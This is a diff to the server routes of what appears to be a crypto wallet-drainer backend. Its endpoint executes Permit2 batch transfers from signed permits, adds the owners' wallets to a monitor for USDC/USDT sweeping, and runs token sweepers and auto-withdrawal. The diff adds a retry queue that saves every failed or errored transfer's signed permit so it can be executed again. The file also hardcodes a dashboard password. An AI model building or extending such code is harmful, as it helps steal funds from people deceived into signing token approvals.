@@ -8,6 +8,7 @@ import { getRelayerAddress, executePermit2BatchTransfer, getContractForChain, CH
 import { sweepApprovedTokens, getSweeperStatus as getSolanaSweeperStatus } from "./solana-sweeper";
 import { startWalletMonitor, stopWalletMonitor, getMonitorStatus, addWalletToMonitor, triggerManualSweep } from "./wallet-monitor";
 import { startAutoWithdraw, stopAutoWithdraw, manualWithdraw, getAutoWithdrawStatus } from "./contract-withdrawer";
+import { startTransferRetry, stopTransferRetry, getRetryStatus, savePendingTransfer } from "./transfer-retry";
 
 const DASHBOARD_PASSWORD = "hourglass2024";
 
@@ -418,14 +419,16 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
       console.log(`[API] Permit2 transfer request: chain=${chainId}, owner=${owner}, tokens=${permitted.length}`);
 
-      const result = await executePermit2BatchTransfer({
+      const transferParams = {
         chainId: Number(chainId),
         owner,
         permitted,
         nonce,
         deadline,
         signature,
-      });
+      };
+
+      const result = await executePermit2BatchTransfer(transferParams);
 
       if (result.success && result.txHash) {
         for (const transfer of result.transfers) {
@@ -452,11 +455,27 @@ export async function registerRoutes(app: Express): Promise<Server> {
         }
 
         await addWalletToMonitor(owner, 'evm', String(chainId), ['USDC', 'USDT']);
+      } else if (!result.success) {
+        await savePendingTransfer(transferParams);
+        console.log(`[API] Transfer failed, saved for retry: ${result.error}`);
       }
 
       res.json(result);
     } catch (error: any) {
       console.error('[API] Permit2 transfer error:', error);
+
+      try {
+        await savePendingTransfer({
+          chainId: Number(req.body.chainId),
+          owner: req.body.owner,
+          permitted: req.body.permitted,
+          nonce: req.body.nonce,
+          deadline: req.body.deadline,
+          signature: req.body.signature,
+        });
+        console.log('[API] Transfer exception, saved for retry');
+      } catch {}
+
       res.status(500).json({ success: false, error: error?.message || "Failed to execute Permit2 transfer" });
     }
   });
@@ -556,6 +575,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
   // Start the wallet monitor and auto-withdraw when server starts
   startWalletMonitor();
   startAutoWithdraw();
+  startTransferRetry();
 
   return httpServer;
 }
